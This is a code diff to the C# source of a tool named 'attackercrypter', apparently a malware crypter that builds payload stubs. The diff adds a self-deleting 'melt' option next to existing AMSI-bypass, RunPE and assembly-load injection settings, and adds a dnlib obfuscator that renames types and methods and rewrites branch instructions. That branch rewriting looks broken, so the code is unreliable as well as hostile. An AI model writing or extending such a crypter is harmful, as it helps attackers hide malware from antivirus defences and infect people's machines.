@@ -13,6 +13,9 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using dnlib.DotNet;
+using dnlib.DotNet.Emit;
+
 
 namespace attackercrypter
 {
@@ -167,7 +170,10 @@ namespace attackercrypter
                 MessageBox.Show("Please Generate a Mutex");
             }
 
-
+            if (melt.Checked && Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
+            {
+                MessageBox.Show("Melt Function Can Be just Used With RUNPE");
+            }
 
             else
             {
@@ -178,6 +184,7 @@ namespace attackercrypter
                 Params.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
                 Params.CompilerOptions = "/unsafe";
                 Params.CompilerOptions += "\n/t:winexe";
+
                 if (string.IsNullOrWhiteSpace(TxtIcon.Text))
                 {
 
@@ -197,7 +204,7 @@ namespace attackercrypter
                 Params.ReferencedAssemblies.Add("System.Drawing.dll");
 
                 Source = Source.Replace("$MUTEX", mutex.Text);
-
+                
                 if (Sleeptime.Checked)
                 {
                     Source = Source.Replace("$SLEEPTIME", (numericUpDownSleep.Value * 1000).ToString());
@@ -306,6 +313,10 @@ namespace attackercrypter
                 if (Amsi.Enabled == true)
                 {
                     Source = Source.Replace("public static bool ispassamsi = false;", "public static bool ispassamsi = true;");
+                }
+                if (melt.Checked)
+                {
+                    Source = Source.Replace("public static bool ismelt = false;", "public static bool ismelt = true;");
                 }
 
                 if (Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
@@ -431,6 +442,73 @@ namespace attackercrypter
             }
 
         }
+        public static void Obfuscate(string inputFile, string outputFile)
+        {
+
+            var module = ModuleDefMD.Load(inputFile);
+
+            var random = new Random();
+            foreach (var type in module.Types)
+            {
+       
+                var className = GenerateRandomString(random, 10);
+                type.Name = className;
+
+
+                foreach (var method in type.Methods.Where(m => m.HasBody))
+                {
+                    var methodName = GenerateRandomString(random, 10);
+                    method.Name = methodName;
+
+        
+                    foreach (var variable in method.Body.Variables)
+                    {
+                        var variableName = GenerateRandomString(random, 5);
+                        variable.Name = variableName;
+                    }
+
+                    foreach (var instruction in method.Body.Instructions)
+                    {
+                        if (instruction.OpCode == OpCodes.Br || instruction.OpCode == OpCodes.Br_S ||
+                            instruction.OpCode == OpCodes.Brfalse || instruction.OpCode == OpCodes.Brfalse_S ||
+                            instruction.OpCode == OpCodes.Brtrue || instruction.OpCode == OpCodes.Brtrue_S ||
+                            instruction.OpCode == OpCodes.Leave || instruction.OpCode == OpCodes.Leave_S)
+                        {
+                            var label = (Instruction)instruction.Operand;
+                            var labelName = GenerateRandomString(random, 5);
+                            label.OpCode = OpCodes.Nop;
+                            label.Operand = null;
+                            label.Offset = instruction.Offset;
+                            instruction.Operand = label;
+                            instruction.OpCode = OpCodes.Br;
+                            label.OpCode = OpCodes.Nop;
+                            label.Operand = null;
+                            label.Offset = instruction.Offset;
+                        }
+                    }
+
+                    // Set CilBody.KeepOldMaxStack to true to ignore stack calculation errors
+                    if (method.Body.HasInstructions)
+                    {
+                        method.Body.KeepOldMaxStack = true;
+                    }
+                }
+            }
+
+
+
+            // Set MetadataOptions.Flags to keep old max stack values
+
+            // Save the obfuscated assembly to disk
+            module.Write(outputFile);
+        }
+
+        private static string GenerateRandomString(Random random, int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
 
         private void button5_Click(object sender, EventArgs e)
         {
@@ -488,6 +566,7 @@ namespace attackercrypter
 
             }
         }
+        
 
         private void button7_Click(object sender, EventArgs e)
         {
@@ -553,5 +632,26 @@ namespace attackercrypter
         {
             mutex.Text = GenerateMutexName("attackercrypter");
         }
+
+        private void button8_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("This Function Still Under Dev");
+            OpenFileDialog dialog = new OpenFileDialog();
+            dialog.Filter = "Executable files (*.exe)|*.exe";
+            dialog.Title = "Select an executable file";
+
+            if (dialog.ShowDialog() == DialogResult.OK)
+            {
+                string selectedFile = dialog.FileName;
+                Obfuscate(selectedFile, "Obfuscated.exe");
+                MessageBox.Show("Saved As Obfuscated.exe");
+            }
+            else
+            {
+    
+            }
+        }
+
     }
-}
+    }
+
